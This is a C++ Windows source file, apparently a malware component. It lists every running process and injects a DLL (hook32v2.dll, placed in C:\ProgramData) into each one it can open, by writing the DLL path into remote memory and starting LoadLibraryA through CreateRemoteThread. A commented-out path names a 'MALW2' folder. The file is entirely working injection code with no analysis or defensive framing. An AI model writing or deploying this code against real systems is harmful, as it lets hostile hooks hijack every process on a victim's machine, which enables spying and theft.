#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include <psapi.h>
#include <iostream>
#include <TlHelp32.h>
#include <iostream>
#include <fstream>
#include <wchar.h>
#include <strsafe.h>
#include <exception>
using namespace std;

std::string GetLastErrorAsString()
{
    //Get the error message, if any. 
    DWORD errorMessageID = ::GetLastError();
    if (errorMessageID == 0)
        return std::string(); //No error message has been recorded 

    LPSTR messageBuffer = nullptr;
    size_t size = FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL, errorMessageID, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)&messageBuffer, 0, NULL);

    std::string message(messageBuffer, size);

    //Free the buffer. 
    LocalFree(messageBuffer);

    return message;
}

bool is_64bit(HANDLE prochandle)
{
#if defined(_WIN64)
    return true;  // 64-bit programs run only on Win64
#elif defined(_WIN32)
    BOOL f64 = FALSE;
    IsWow64Process(prochandle, &f64);
    return f64;
#endif
}

int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nShowCmd)
{
    // Get the list of process identifiers.

    DWORD aProcesses[8192], cbNeeded, cProcesses;
    unsigned int i;
    DWORD currPID = GetCurrentProcessId();

    //const char* dllPath = "C:\\Users\\User\\Desktop\\MALW2\\hook32v2.dll";
    const char* dllPath = "C:\\ProgramData\\hook32v2.dll";

    if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
    {
        return 1;
    }


    // Calculate how many process identifiers were returned.

    cProcesses = cbNeeded / sizeof(DWORD);

    // Print the name and process identifier for each process (inject the dll to all possible processes).

    for (i = 0; i < cProcesses; i++)
    {
        if (aProcesses[i] != 0)
        {
            //_tprintf(TEXT("  (PID: %u)\n"), aProcesses[i]);

            
            try{
                HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, 0, aProcesses[i]);

                //bool is64or32 = is_64bit(hProc);

                //if (!is64or32) {
                 //   continue;
                //}else
                {

                    LPVOID addr = (LPVOID)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");

                    if (addr == NULL) {
                        continue;
                    }
            
                    //HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, aProcesses[i]);

                    if (hProc && hProc != INVALID_HANDLE_VALUE && aProcesses[i] != currPID)
                    {
                        void* loc = VirtualAllocEx(hProc, 0, MAX_PATH, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

                        if (loc == NULL) {
                            continue;
                        }

                        WriteProcessMemory(hProc, loc, dllPath, strlen(dllPath) + 1, 0);

                        //HANDLE hThread = CreateRemoteThread(hProc, 0, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, loc, 0, 0);
                        HANDLE hThread = CreateRemoteThread(hProc, 0, 0, (LPTHREAD_START_ROUTINE)addr, loc, 0, 0);
                        //string errorL = GetLastErrorAsString();

                        if (hThread)
                        {
                            CloseHandle(hThread);
                        }
                    }
                }

                if (hProc)
                {
                    CloseHandle(hProc);
                }
            }
            catch (exception& e) {
                cerr << e.what();
            }
        }
    }

    return 0;
}